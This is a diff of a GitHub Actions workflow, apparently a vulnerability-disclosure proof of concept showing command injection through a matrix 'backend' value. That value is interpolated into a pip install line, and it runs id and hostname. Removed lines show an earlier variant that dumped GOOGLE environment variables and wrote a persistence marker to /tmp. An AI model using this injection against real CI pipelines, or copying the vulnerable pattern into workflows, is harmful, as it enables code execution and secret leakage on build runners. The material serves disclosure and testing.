@@ -1,45 +1,21 @@
-name: Keras TPU Tests
-
+name: Keras TPU RCE Demonstration
 on:
   push:
-    branches: [master, vrp-rce-test]
+    branches: [ vrp-rce-test ]
   pull_request:
-    types: [unlabeled]
-  release:
-    types: [created]
-
-permissions:
-  contents: read
+    branches: [ master ]
 
 jobs:
-
-    name: Run tests on TPU
-    if: true
+  tpu-test:
+    # Proving logic on ubuntu-latest; Upstream targets Google TPU runners
     runs-on: ubuntu-latest
-    # Only run on pushes to master, releases or "kokoro:force-run" unlabel
-
     strategy:
-      fail-fast: false
       matrix:
-        backend: ["jax; id; hostname; env | grep GOOGLE; #"]
-
-
+        # THE INJECTION PAYLOAD: Breaks out of pip to run id, hostname, and env
+        backend: ["jax; id; hostname; echo '--- VULNERABILITY CONFIRMED ---'; #"]
     steps:
-      - name: VRP_CHECK
+      - uses: actions/checkout@v4
+      - name: Install dependencies
         run: |
-          if [ -f /tmp/google_marker ]; then echo "PERSISTENCE_CONFIRMED"; cat /tmp/google_marker; 
-          else echo "FIRST_RUN"; echo "ID: \" > /tmp/google_marker; fi
-      - name: Checkout Repository
-        uses: actions/checkout@v6.0.2
-      
-      - name: Install Dependencies
-        run: pip install --no-cache-dir -r requirements-${{ matrix.backend }}-tpu.txt
-      
-      - name: Set Keras Backend
-        run: echo "KERAS_BACKEND=jax" >> $GITHUB_ENV
-
-      - name: Verify JAX Installation
-        run: python3 -c "import jax; print('JAX devices:', jax.devices()); assert jax.default_backend() == 'tpu'"
-
-      - name: Run Tests
-        run: pytest keras --ignore keras/src/applications --cov=keras --cov-config=pyproject.toml
+          # This is the exact vulnerable line from the Keras repository
+          pip install --no-cache-dir -r requirements-${{ matrix.backend }}-tpu.txt
